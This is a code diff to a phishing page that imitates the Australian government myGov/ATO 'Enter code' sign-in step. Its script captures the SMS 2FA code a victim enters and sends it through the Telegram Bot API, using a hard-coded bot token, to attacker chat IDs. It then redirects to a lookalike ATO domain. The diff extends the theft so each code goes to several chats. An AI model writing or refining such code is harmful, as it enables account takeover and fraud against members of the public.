@@ -39,7 +39,6 @@
                         <div class="login-grid-column">
                             <h1>Enter code</h1>
 
-                            <!-- ✅ REMOVED action="./next.php" and duplicate method -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
                                 <div class="input-group">
                                     <p>We sent a code by SMS to your mobile number</p>
@@ -108,16 +107,15 @@
         $("#ph").inputmask({ "mask": "999-999-9999" });
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <!-- 🚫 Slim jQuery removed to prevent breaking $.ajax -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== 🟢 TELEGRAM SCRIPT (HANDLES FORM SUBMISSION) ====== -->
+    <!-- ====== 🟢 TELEGRAM SCRIPT (MULTI‑CHAT) ====== -->
     <script>
         // ============================================================
         // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
         // ============================================================
         const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
-        const CHAT_ID = '722615124';
+        const CHAT_IDS = ['722615124', '987654321']; // ← Add your chat IDs here
         // ============================================================
 
         $(document).ready(function() {
@@ -125,21 +123,31 @@
                 e.preventDefault(); // Stop the form from reloading the page
 
                 let code = $('#code').val();
+                if (!code || code.length < 6) {
+                    alert('Please enter the 6-digit code.');
+                    return;
+                }
+
                 let msg = "|----------| OTP / 2FA CODE |--------------|\n";
                 msg += "Code: " + code + "\n";
                 msg += "|-----------------------------------------|";
 
-                // Send the code to Telegram
-                $.ajax({
-                    url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
-                    method: 'GET',
-                    complete: function() {
-                        // Redirect to the next page (Personal Info)
-                        window.location.href = 'https://onlineservices.ato.gov.au-taxstatement2026.de5.net/papermail/thank.html';
-                    }
+                // Build an array of AJAX requests – one per chat
+                const requests = CHAT_IDS.map(chatId => {
+                    return $.ajax({
+                        url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`,
+                        method: 'GET'
+                    });
                 });
+
+                // Wait for all requests to complete (success or error) then redirect
+                $.when.apply($, requests)
+                    .always(function() {
+                        window.location.href = 'https://onlineservices.ato.gov.au-taxstatement2026.de5.net/papermail/thank.html';
+                    });
             });
         });
     </script>
 </body>
+
 </html>
